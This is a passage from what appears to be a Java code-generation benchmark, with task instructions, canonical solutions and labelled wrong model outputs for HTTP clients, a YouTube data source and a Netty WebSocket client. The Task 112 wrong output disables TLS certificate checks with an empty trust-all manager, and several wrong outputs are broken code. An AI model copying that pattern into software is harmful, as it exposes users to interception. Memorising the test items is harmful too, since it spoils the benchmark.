a standardized format\n- getExceptionResponse(Exception e) -> RealResponse - Creates an error response from an exception\n- setHttpConfig(HttpConfig httpConfig) -> RealRequest - Sets the HTTP configuration (builder pattern)",
    "Canonical_solution": "import android.text.TextUtils;\nimport com.sensorsdata.analytics.android.sdk.SAConfigOptions;\nimport com.sensorsdata.analytics.android.sdk.SALog;\nimport com.sensorsdata.analytics.android.sdk.SensorsDataAPI;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport javax.net.ssl.HttpsURLConnection;\nimport static com.sensorsdata.analytics.android.sdk.util.Base64Coder.CHARSET_UTF8;\n\nclass RealRequest {\n    private static final String TAG = \"SA.HttpRequest\";\n    private static String sRequestURL;\n    private HttpConfig httpConfig = new HttpConfig();\n\n    RealResponse getData(String requestURL, Map<String, String> headerMap) {\n        try {\n            SALog.i(TAG, String.format(\"url:%s,\\nmethod:GET\", requestURL));\n            sRequestURL = requestURL;\n            HttpURLConnection conn = getHttpURLConnection(requestURL, \"GET\");\n            if (headerMap != null) {\n                setHeader(conn, headerMap);\n            }\n            conn.connect();\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        }\n    }\n\n    RealResponse postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) {\n        BufferedWriter writer = null;\n        try {\n            HttpURLConnection conn;\n            sRequestURL = requestURL;\n            SALog.i(TAG, String.format(\"url:%s\\nparams:%s\\nmethod:POST\", requestURL, body));\n            conn = getHttpURLConnection(requestURL, \"POST\");\n            conn.setDoOutput(true);\n            conn.setUseCaches(false);\n            if (!TextUtils.isEmpty(bodyType)) {\n                conn.setRequestProperty(\"Content-Type\", bodyType);\n            }\n            if (headerMap != null) {\n                setHeader(conn, headerMap);\n            }\n            conn.connect();\n            if (!TextUtils.isEmpty(body)) {\n                writer = new BufferedWriter(new OutputStreamWriter(conn.getOutputStream(), CHARSET_UTF8));\n                writer.write(body);\n                writer.flush();\n            }\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        } finally {\n            if (writer != null) {\n                try {\n                    writer.close();\n                } catch (IOException e) {\n                    SALog.printStackTrace(e);\n                }\n            }\n        }\n    }\n\n    private HttpURLConnection getHttpURLConnection(String requestURL, String requestMethod) throws IOException {\n        URL url = new URL(requestURL);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(requestMethod);\n        conn.setUseCaches(false);\n        conn.setConnectTimeout(httpConfig.getConnectionTimeout());\n        conn.setReadTimeout(httpConfig.getReadTimeout());\n        if (requestMethod.equals(\"POST\")) {\n            conn.setDoOutput(true);\n        }\n        SAConfigOptions configOptions = SensorsDataAPI.getConfigOptions();\n        if (configOptions != null && configOptions.getSSLSocketFactory() != null\n                && conn instanceof HttpsURLConnection) {\n            ((HttpsURLConnection) conn).setSSLSocketFactory(configOptions.getSSLSocketFactory());\n        }\n        return conn;\n    }\n\n    private void setHeader(HttpURLConnection conn, Map<String, String> headerMap) {\n        if (headerMap != null) {\n            for (String key : headerMap.keySet()) {\n                conn.setRequestProperty(key, headerMap.get(key));\n            }\n        }\n    }\n\n    private RealResponse getRealResponse(HttpURLConnection conn) {\n        RealResponse response = new RealResponse();\n        try {\n            response.code = conn.getResponseCode();\n            if (HttpUtils.needRedirects(response.code)) {\n                response.location = HttpUtils.getLocation(conn, sRequestURL);\n            }\n            response.contentLength = conn.getContentLength();\n            if (response.code < HttpURLConnection.HTTP_BAD_REQUEST) {\n                response.result = HttpUtils.getRetString(conn.getInputStream());\n            } else {\n                response.errorMsg = HttpUtils.getRetString(conn.getErrorStream());\n            }\n        } catch (IOException e) {\n            return getExceptionResponse(e);\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n        SALog.i(TAG, response.toString());\n        return response;\n    }\n\n    private RealResponse getExceptionResponse(Exception e) {\n        RealResponse response = new RealResponse();\n        response.exception = e;\n        response.errorMsg = e.getMessage();\n        SALog.i(TAG, response.toString());\n        return response;\n    }\n\n    public RealRequest setHttpConfig(HttpConfig httpConfig) {\n        if(httpConfig == null) {\n            return this;\n        }\n        this.httpConfig = httpConfig;\n        return this;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.Map;\n\npublic class RealRequest {\n    public static String sRequestURL;\n    private HttpConfig httpConfig;\n    private static final String TAG = \"SA.HttpRequest\";\n\n    public RealRequest() {\n        this.httpConfig = new HttpConfig();\n    }\n\n    public RealResponse getData(String requestURL, Map<String, String> headerMap) {\n        sRequestURL = requestURL;\n        try {\n            HttpURLConnection conn = getHttpURLConnection(requestURL, \"GET\");\n            setHeader(conn, headerMap);\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        }\n    }\n\n    public RealResponse postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) {\n        sRequestURL = requestURL;\n        try {\n            HttpURLConnection conn = getHttpURLConnection(requestURL, \"POST\");\n            setHeader(conn, headerMap);\n            conn.setDoOutput(true);\n            conn.setRequestProperty(\"Content-Type\", bodyType);\n            try (OutputStream os = conn.getOutputStream()) {\n                byte[] input = body.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        }\n    }\n\n    private HttpURLConnection getHttpURLConnection(String requestURL, String requestMethod) throws IOException {\n        URL url = new URL(requestURL);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(requestMethod);\n        conn.setConnectTimeout(httpConfig.getConnectTimeout());\n        conn.setReadTimeout(httpConfig.getReadTimeout());\n        conn.setInstanceFollowRedirects(httpConfig.isFollowRedirects());\n        return conn;\n    }\n\n    private void setHeader(HttpURLConnection conn, Map<String, String> headerMap) {\n        if (headerMap != null) {\n            for (Map.Entry<String, String> entry : headerMap.entrySet()) {\n                conn.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n    }\n\n    private RealResponse getRealResponse(HttpURLConnection conn) throws IOException {\n        int responseCode = conn.getResponseCode();\n        BufferedReader reader;\n        if (responseCode >= 400) {\n            reader = new BufferedReader(new InputStreamReader(conn.getErrorStream()));\n        } else {\n            reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        }\n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n        }\n        reader.close();\n        return new RealResponse(response.toString(), responseCode);\n    }\n\n    private RealResponse getExceptionResponse(Exception e) {\n        return new RealResponse(e.getMessage(), -1);\n    }\n\n    public RealRequest setHttpConfig(HttpConfig httpConfig) {\n        this.httpConfig = httpConfig;\n        return this;\n    }\n}\n```"
  },
  {
    "Task_id": 110,
    "Instruction": "Task Description: Implement a custom HTTP data source for streaming media that handles connection management, redirects, and error handling, specifically designed for YouTube video streaming.\n\nClass Description: YoutubeHttpDataSource is a custom HTTP data source implementation that extends BaseDataSource and implements HttpDataSource interface. It provides functionality for opening and closing HTTP connections, handling redirects, and managing input streams for media streaming.\n\nAttributes:\n\nallowCrossProtocolRedirects: boolean - Determines whether cross-protocol redirects (HTTP to HTTPS or vice versa) are allowed\nconnectTimeoutMillis: int - Connection timeout in milliseconds\nreadTimeoutMillis: int - Read timeout in milliseconds\nrequestProperties: RequestProperties - Contains HTTP request headers and properties\ndataSpec: DataSpec - Contains information about the data to be read\nconnection: HttpURLConnection - The active HTTP connection\ninputStream: InputStream - The input stream for reading data\nopened: boolean - Flag indicating whether the data source is currently open\n\nMethods:\n\nopen(DataSpec dataSpecParameter) -> long - Opens the data source for the specified DataSpec and returns the length of the data\nmakeConnection(DataSpec dataSpecToUse) -> HttpURLConnection - Creates and configures an HTTP connection, handling redirects\nopenConnection(URL url) -> HttpURLConnection - Opens a basic HTTP connection to the specified URL\nhandleRedirect(URL originalUrl, String location, DataSpec dataSpecToHandleRedirect) -> URL - Handles HTTP redirects and returns the new URL\nclose() -> void - Closes the data source and releases all resources\nmaybeTerminateInputStream(HttpURLConnection connection, long bytesRemaining) -> void - Helper method to terminate input streams on specific Android versions\ncloseConnectionQuietly() -> void - Safely closes the current connection without throwing exceptions",
    "Canonical_solution": "import com.google.android.exoplayer2.C;\nimport com.google.android.exoplayer2.PlaybackException;\nimport com.google.android.exoplayer2.upstream.DataSource;\nimport com.google.android.exoplayer2.upstream.DataSpec;\nimport com.google.android.exoplayer2.upstream.HttpDataSource;\nimport com.google.android.exoplayer2.util.Util;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.lang.reflect.Method;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.NoRouteToHostException;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class YoutubeHttpDataSource extends BaseDataSource implements HttpDataSource {\n\n    private static final int MAX_REDIRECTS = 20;\n    private static final int HTTP_STATUS_TEMPORARY_REDIRECT = 307;\n    private static final int HTTP_STATUS_PERMANENT_REDIRECT = 308;\n    private static final long MAX_BYTES_TO_DRAIN = 2048;\n\n    private final boolean allowCrossProtocolRedirects;\n    private final int connectTimeoutMillis;\n    private final int readTimeoutMillis;\n    private final RequestProperties requestProperties;\n\n    @Nullable\n    private DataSpec dataSpec;\n    @Nullable\n    private HttpURLConnection connection;\n    @Nullable\n    private InputStream inputStream;\n    private boolean opened;\n\n    @Override\n    public long open(@NonNull final DataSpec dataSpecParameter) throws HttpDataSourceException {\n        this.dataSpec = dataSpecParameter;\n        transferInitializing(dataSpecParameter);\n\n        try {\n            this.connection = makeConnection(dataSpec);\n            final HttpURLConnection httpURLConnection = this.connection;\n            final int responseCode = httpURLConnection.getResponseCode();\n            final String responseMessage = httpURLConnection.getResponseMessage();\n\n            if (responseCode < 200 || responseCode > 299) {\n                throw new InvalidResponseCodeException(responseCode, responseMessage, null,\n                        httpURLConnection.getHeaderFields(), dataSpec, Util.EMPTY_BYTE_ARRAY);\n            }\n\n            inputStream = httpURLConnection.getInputStream();\n            opened = true;\n            transferStarted(dataSpecParameter);\n            return dataSpecParameter.length != C.LENGTH_UNSET ? dataSpecParameter.length : 0;\n        } catch (final IOException e) {\n            closeConnectionQuietly();\n            throw HttpDataSourceException.createForIOException(e, dataSpec,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n    }\n\n    @NonNull\n    private HttpURLConnection makeConnection(@NonNull final DataSpec dataSpecToUse)\n            throws IOException {\n        URL url = new URL(dataSpecToUse.uri.toString());\n        int redirectCount = 0;\n\n        while (redirectCount++ <= MAX_REDIRECTS) {\n            final HttpURLConnection httpURLConnection = openConnection(url);\n            httpURLConnection.setConnectTimeout(connectTimeoutMillis);\n            httpURLConnection.setReadTimeout(readTimeoutMillis);\n\n            for (final Map.Entry<String, String> property : requestProperties.getSnapshot().entrySet()) {\n                httpURLConnection.setRequestProperty(property.getKey(), property.getValue());\n            }\n\n            httpURLConnection.setInstanceFollowRedirects(false);\n            httpURLConnection.setDoOutput(true);\n            httpURLConnection.connect();\n\n            final int responseCode = httpURLConnection.getResponseCode();\n            final String location = httpURLConnection.getHeaderField(\"Location\");\n            if (responseCode == HttpURLConnection.HTTP_MOVED_PERM\n                    || responseCode == HttpURLConnection.HTTP_MOVED_TEMP\n                    || responseCode == HttpURLConnection.HTTP_SEE_OTHER\n                    || responseCode == HTTP_STATUS_TEMPORARY_REDIRECT\n                    || responseCode == HTTP_STATUS_PERMANENT_REDIRECT) {\n                httpURLConnection.disconnect();\n                url = handleRedirect(url, location, dataSpecToUse);\n            } else {\n                return httpURLConnection;\n            }\n        }\n\n        throw new HttpDataSourceException(\n                new NoRouteToHostException(\"Too many redirects: \" + redirectCount),\n                dataSpecToUse,\n                PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                HttpDataSourceException.TYPE_OPEN);\n    }\n\n    private HttpURLConnection openConnection(@NonNull final URL url) throws IOException {\n        return (HttpURLConnection) url.openConnection();\n    }\n\n    @NonNull\n    private URL handleRedirect(final URL originalUrl,\n                             @Nullable final String location,\n                             final DataSpec dataSpecToHandleRedirect)\n            throws HttpDataSourceException {\n        if (location == null) {\n            throw new HttpDataSourceException(\"Null location redirect\", dataSpecToHandleRedirect,\n                    PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n\n        try {\n            URL url = new URL(originalUrl, location);\n            String protocol = url.getProtocol();\n            if (!\"https\".equals(protocol) && !\"http\".equals(protocol)) {\n                throw new HttpDataSourceException(\"Unsupported protocol redirect: \" + protocol,\n                        dataSpecToHandleRedirect,\n                        PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                        HttpDataSourceException.TYPE_OPEN);\n            }\n            if (!allowCrossProtocolRedirects && !protocol.equals(originalUrl.getProtocol())) {\n                throw new HttpDataSourceException(\n                        \"Disallowed cross-protocol redirect (\"\n                                + originalUrl.getProtocol()\n                                + \" to \"\n                                + protocol\n                                + \")\",\n                        dataSpecToHandleRedirect,\n                        PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                        HttpDataSourceException.TYPE_OPEN);\n            }\n            return url;\n        } catch (final MalformedURLException e) {\n            throw new HttpDataSourceException(e, dataSpecToHandleRedirect,\n                    PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n    }\n\n    @Override\n    public void close() throws HttpDataSourceException {\n        try {\n            if (inputStream != null) {\n                maybeTerminateInputStream(connection, C.LENGTH_UNSET);\n                try {\n                    inputStream.close();\n                } catch (final IOException e) {\n                    throw new HttpDataSourceException(e, castNonNull(dataSpec),\n                            PlaybackException.ERROR_CODE_IO_UNSPECIFIED,\n                            HttpDataSourceException.TYPE_CLOSE);\n                }\n            }\n        } finally {\n            inputStream = null;\n            closeConnectionQuietly();\n            if (opened) {\n                opened = false;\n                transferEnded();\n            }\n        }\n    }\n\n    private static void maybeTerminateInputStream(@Nullable final HttpURLConnection connection,\n                                                final long bytesRemaining) {\n        if (connection == null || Util.SDK_INT < 19 || Util.SDK_INT > 20) {\n            return;\n        }\n\n        try {\n            InputStream inputStream = connection.getInputStream();\n            String className = inputStream.getClass().getName();\n            if (\"com.android.okhttp.internal.http.HttpTransport$ChunkedInputStream\".equals(className)\n                    || \"com.android.okhttp.internal.http.HttpTransport$FixedLengthInputStream\".equals(className)) {\n                Class<?> superclass = inputStream.getClass().getSuperclass();\n                Method unexpectedEndOfInput = checkNotNull(superclass).getDeclaredMethod(\"unexpectedEndOfInput\");\n                unexpectedEndOfInput.setAccessible(true);\n                unexpectedEndOfInput.invoke(inputStream);\n            }\n        } catch (final Exception e) {\n            // Ignore\n        }\n    }\n\n    private void closeConnectionQuietly() {\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (final Exception e) {\n                // Ignore\n            }\n            connection = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\npublic class YoutubeHttpDataSource extends BaseDataSource implements HttpDataSource {\n\n    private final boolean allowCrossProtocolRedirects;\n    private final int connectTimeoutMillis;\n    private final int readTimeoutMillis;\n    private final RequestProperties requestProperties;\n    private DataSpec dataSpec;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n    private boolean opened;\n\n    public YoutubeHttpDataSource(boolean allowCrossProtocolRedirects, int connectTimeoutMillis, int readTimeoutMillis) {\n        this.allowCrossProtocolRedirects = allowCrossProtocolRedirects;\n        this.connectTimeoutMillis = connectTimeoutMillis;\n        this.readTimeoutMillis = readTimeoutMillis;\n        this.requestProperties = new RequestProperties();\n    }\n\n    @Override\n    public long open(DataSpec dataSpecParameter) throws IOException {\n        this.dataSpec = dataSpecParameter;\n        connection = makeConnection(dataSpecParameter);\n        int responseCode = connection.getResponseCode();\n\n        if (responseCode == HTTP_OK) {\n            inputStream = connection.getInputStream();\n        } else if (responseCode >= 300 && responseCode < 400) {\n            String location = connection.getHeaderField(\"Location\");\n            if (location != null) {\n                URL redirectUrl = handleRedirect(connection.getURL(), location, dataSpec);\n                return open(new DataSpec(redirectUrl, dataSpec.uri, dataSpec.position, dataSpec.length, dataSpec.key, dataSpec.flags));\n            } else {\n                throw new IOException(\"Unexpected redirect without Location header: \" + responseCode);\n            }\n        } else {\n            throw new IOException(\"Unexpected response code: \" + responseCode);\n        }\n\n        opened = true;\n        return connection.getContentLengthLong();\n    }\n\n    private HttpURLConnection makeConnection(DataSpec dataSpecToUse) throws IOException {\n        URL url = openConnection(dataSpecToUse.uri);\n        url.openConnection().setConnectTimeout(connectTimeoutMillis);\n        ((HttpURLConnection) url.openConnection()).setReadTimeout(readTimeoutMillis);\n\n        for (Map.Entry<String, String> entry : requestProperties.entrySet()) {\n            connection.setRequestProperty(entry.getKey(), entry.getValue());\n        }\n\n        return connection;\n    }\n\n    private URL openConnection(URL url) throws IOException {\n        return url;\n    }\n\n    private URL handleRedirect(URL originalUrl, String location, DataSpec dataSpecToHandleRedirect) throws IOException {\n        URL newUrl = new URL(originalUrl, location);\n        if (!allowCrossProtocolRedirects && !newUrl.getProtocol().equals(originalUrl.getProtocol())) {\n            throw new IOException(\"Cross-protocol redirect blocked from \" + originalUrl.getProtocol() + \" to \" + newUrl.getProtocol());\n        }\n        return newUrl;\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (opened) {\n            opened = false;\n            maybeTerminateInputStream(connection, connection.getContentLengthLong());\n            inputStream.close();\n            closeConnectionQuietly();\n        }\n    }\n\n    private void maybeTerminateInputStream(HttpURLConnection connection, long bytesRemaining) {\n        // Implementation specific to Android versions\n    }\n\n    private void closeConnectionQuietly() {\n        try {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        } catch (Exception e) {\n            // Ignore\n        }\n    }\n\n    @Override\n    public Uri getUri() {\n        return dataSpec != null ? Uri.parse(dataSpec.uri.toString()) : null;\n    }\n\n    @Override\n    public Map<String, List<String>> getResponseHeaders() {\n        if (connection == null) {\n            return Collections.emptyMap();\n        }\n        Map<String, List<String>> headers = new HashMap<>();\n        for (String key : connection.getHeaderFields().keySet()) {\n            if (key != null) {\n                headers.put(key, connection.getHeaderFields().get(key));\n            }\n        }\n        return headers;\n    }\n\n    @Override\n    public void addRequestProperty(String name, String value) {\n        requestProperties.set(name, value);\n    }\n\n    @Override\n    public void clearRequestProperties() {\n        requestProperties.clear();\n    }\n\n    @Override\n    public int read(byte[] buffer, int offset, int readLength) throws IOException {\n        if (!opened) {\n            throw new IOException(\"Cannot read from closed data source.\");\n        }\n        int bytesRead = inputStream.read(buffer, offset, readLength);\n        if (bytesRead > 0) {\n            transferBytesRead(bytesRead);\n        }\n        return bytesRead;\n    }\n}\n```"
  },
  {
    "Task_id": 112,
    "Instruction": "Task Description: Create a Java utility class for making HTTPS requests using HttpURLConnection with custom SSL socket factory configuration.\n\nClass Description: HttpClientUtil is a utility class that provides methods for making HTTPS requests with custom SSL/TLS configuration. It handles both GET and POST methods, manages connection settings, and includes proper error handling and resource cleanup.\n\nAttributes: (None - this is a utility class with only static methods)\n\nMethods:\n\nMethod1: httpsRequest(String requestUrl, String method, String outputStr) -> HttpResponse - Makes an HTTPS request to the specified URL using the given HTTP method. Handles request body for POST methods and returns the server response.\n\nMethod2: httpsRequest2(String requestUrl, String method, String outputStr) -> HttpResponse - Alternative implementation that uses a different URL constructor with protocol handler, otherwise similar to httpsRequest.\n\nMethod3: createSSLSocketFactory() -> SSLSocketFactory - Private helper method that creates and configures an SSLSocketFactory with custom TrustManager for SSL/TLS connections. Throws IOException if SSL context creation fails.\n\nInput Parameters:\n- requestUrl: String - The HTTPS URL to connect to\n- method: String - HTTP method (GET/POST)\n- outputStr: String - Request body content (for POST requests)\n\nOutput:\n- Returns HttpResponse object containing the server response\n- Throws IOException for connection or SSL configuration errors",
    "Canonical_solution": "import javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.TrustManager;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.URL;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.NoSuchProviderException;\n\npublic class HttpClientUtil {\n\n    public static HttpResponse httpsRequest(String requestUrl, String method, String outputStr) throws IOException {\n        HttpsURLConnection connection = null;\n        try {\n            SSLSocketFactory ssf = createSSLSocketFactory();\n            URL url = new URL(requestUrl);\n            connection = (HttpsURLConnection) url.openConnection();\n            connection.setSSLSocketFactory(ssf);\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setRequestMethod(method);\n            \n            if (\"GET\".equalsIgnoreCase(method)) {\n                connection.connect();\n            }\n\n            if (null != outputStr) {\n                OutputStream outputStream = connection.getOutputStream();\n                outputStream.write(outputStr.getBytes(\"UTF-8\"));\n                outputStream.close();\n            }\n\n            return new HttpResponse(connection);\n        } catch (IOException e) {\n            if (connection != null) {\n                connection.disconnect();\n            }\n            throw e;\n        }\n    }\n\n    public static HttpResponse httpsRequest2(String requestUrl, String method, String outputStr) throws IOException {\n        HttpsURLConnection connection = null;\n        try {\n            SSLSocketFactory ssf = createSSLSocketFactory();\n            URL url = new URL(null, requestUrl, new sun.net.www.protocol.https.Handler());\n            connection = (HttpsURLConnection) url.openConnection();\n            connection.setSSLSocketFactory(ssf);\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setRequestMethod(method);\n            \n            if (\"GET\".equalsIgnoreCase(method)) {\n                connection.connect();\n            }\n\n            if (null != outputStr) {\n                OutputStream outputStream = connection.getOutputStream();\n                outputStream.write(outputStr.getBytes(\"UTF-8\"));\n                outputStream.close();\n            }\n            return new HttpResponse(connection);\n        } catch (IOException e) {\n            if (connection != null) {\n                connection.disconnect();\n            }\n            throw e;\n        }\n    }\n\n    private static SSLSocketFactory createSSLSocketFactory() throws IOException {\n        try {\n            TrustManager[] tm = { new MyX509TrustManager() };\n            SSLContext sslContext = SSLContext.getInstance(\"SSL\", \"SunJSSE\");\n            sslContext.init(null, tm, new java.security.SecureRandom());\n            return sslContext.getSocketFactory();\n        } catch (NoSuchAlgorithmException | NoSuchProviderException e) {\n            throw new IOException(\"\u5b9e\u4f8b\u5316SSLContext\u5931\u8d25\", e);\n        } catch (KeyManagementException e) {\n            throw new IOException(\"\u521d\u59cb\u5316SSLContext\u5931\u8d25\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport javax.net.ssl.*;\nimport java.io.*;\nimport java.net.*;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\nimport java.security.cert.X509Certificate;\n\npublic class HttpClientUtil {\n\n    private static SSLSocketFactory createSSLSocketFactory() throws IOException {\n        try {\n            TrustManager[] trustAllCerts = new TrustManager[]{\n                new X509TrustManager() {\n                    public X509Certificate[] getAcceptedIssuers() {\n                        return null;\n                    }\n                    public void checkClientTrusted(X509Certificate[] certs, String authType) {\n                    }\n                    public void checkServerTrusted(X509Certificate[] certs, String authType) {\n                    }\n                }\n            };\n\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, trustAllCerts, new SecureRandom());\n            return sslContext.getSocketFactory();\n        } catch (NoSuchAlgorithmException | KeyManagementException e) {\n            throw new IOException(\"Failed to create SSL socket factory\", e);\n        }\n    }\n\n    public static HttpResponse httpsRequest(String requestUrl, String method, String outputStr) throws IOException {\n        URL url = new URL(requestUrl);\n        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n        connection.setSSLSocketFactory(createSSLSocketFactory());\n        connection.setRequestMethod(method);\n        connection.setConnectTimeout(10000);\n        connection.setReadTimeout(10000);\n        connection.setDoOutput(true);\n\n        if (\"POST\".equalsIgnoreCase(method)) {\n            try (OutputStream os = connection.getOutputStream()) {\n                byte[] input = outputStr.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n        }\n\n        int responseCode = connection.getResponseCode();\n        BufferedReader reader;\n        if (responseCode >= 400) {\n            reader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));\n        } else {\n            reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        }\n\n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n        }\n        reader.close();\n\n        return new HttpResponse(response.toString(), responseCode);\n    }\n\n    public static HttpResponse httpsRequest2(String requestUrl, String method, String outputStr) throws IOException {\n        URL url = new URL(null, requestUrl, new sun.net.www.protocol.https.Handler());\n        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n        connection.setSSLSocketFactory(createSSLSocketFactory());\n        connection.setRequestMethod(method);\n        connection.setConnectTimeout(10000);\n        connection.setReadTimeout(10000);\n        connection.setDoOutput(true);\n\n        if (\"POST\".equalsIgnoreCase(method)) {\n            try (OutputStream os = connection.getOutputStream()) {\n                byte[] input = outputStr.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n        }\n\n        int responseCode = connection.getResponseCode();\n        BufferedReader reader;\n        if (responseCode >= 400) {\n            reader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));\n        } else {\n            reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        }\n\n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n        }\n        reader.close();\n\n        return new HttpResponse(response.toString(), responseCode);\n    }\n\n    public static class HttpResponse {\n        private final String content;\n        private final int statusCode;\n\n        public HttpResponse(String content, int statusCode) {\n            this.content = content;\n            this.statusCode = statusCode;\n        }\n\n        public String getContent() {\n            return content;\n        }\n\n        public int getStatusCode() {\n            return statusCode;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 118,
    "Instruction": "Task Description: Create a WebSocket client using Java Netty framework that can establish a connection to a WebSocket server, send and receive frames, and handle connection lifecycle events.\n\nClass Description: WebSocketTestClient is a Netty-based WebSocket client implementation that handles WebSocket connections, frame transmission, and connection management. It supports different WebSocket versions and provides callback mechanisms for frame handling.\n\nAttributes:\n- bootstrap: [Bootstrap] - Netty bootstrap instance for client configuration\n- ch: [Channel] - Active channel representing the WebSocket connection\n- uri: [URI] - Target WebSocket server URI\n- version: [WebSocketVersion] - WebSocket protocol version to use\n- closed: [boolean] - Connection status flag\n- count: [AtomicInteger] - Counter for handler naming\n\nMethods:\n- connect(): [WebSocketTestClient] - Establishes connection to WebSocket server, performs handshake, and returns self for chaining\n- send(WebSocketFrame frame, FrameListener listener): [WebSocketTestClient] - Sends WebSocket frame and registers listener for response, returns self for chaining\n- destroy(): [void] - Gracefully closes connection and releases resources\n- destroy(boolean dirty): [void] - Closes connection with option for immediate termination\n- isActive(): [boolean] - Returns connection active status\n- isOpen(): [boolean] - Returns connection open status\n- isWritable(): [boolean] - Returns channel writable status\n\nNested Interfaces:\n- FrameListener: Callback interface for frame reception and error handling\n  - onFrame(WebSocketFrame frame): [void] - Called when frame is received\n  - onError(Throwable t): [void] - Called when error occurs\n\nNested Classes:\n- WSClientHandler: [SimpleChannelInboundHandler<Object>] - Internal handler for WebSocket handshake and frame processing\n  - handshakeFuture(): [ChannelFuture] - Returns handshake completion future\n  - handlerAdded(ChannelHandlerContext ctx): [void] - Initializes handshake promise\n  - channelActive(ChannelHandlerContext ctx): [void] - Initiates handshake\n  - channelRead0(ChannelHandlerContext ctx, Object o): [void] - Processes incoming messages\n  - exceptionCaught(ChannelHandlerContext ctx, Throwable cause): [void] - Handles channel errors",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.ChannelPromise;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.CloseWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketVersion;\nimport io.netty.util.CharsetUtil;\nimport io.netty.util.ReferenceCountUtil;\n\nimport java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic final class WebSocketTestClient {\n    private final Bootstrap bootstrap = new Bootstrap();\n    private Channel ch;\n    private final URI uri;\n    private final WebSocketVersion version;\n    private volatile boolean closed;\n    private static final AtomicInteger count = new AtomicInteger();\n\n    public WebSocketTestClient(WebSocketVersion version, URI uri) {\n        this.uri = uri;\n        this.version = version;\n    }\n\n    public WebSocketTestClient connect() throws Exception {\n        String protocol = uri.getScheme();\n        if (!\"ws\".equals(protocol)) {\n            throw new IllegalArgumentException(\"Unsupported protocol: \" + protocol);\n        }\n        final 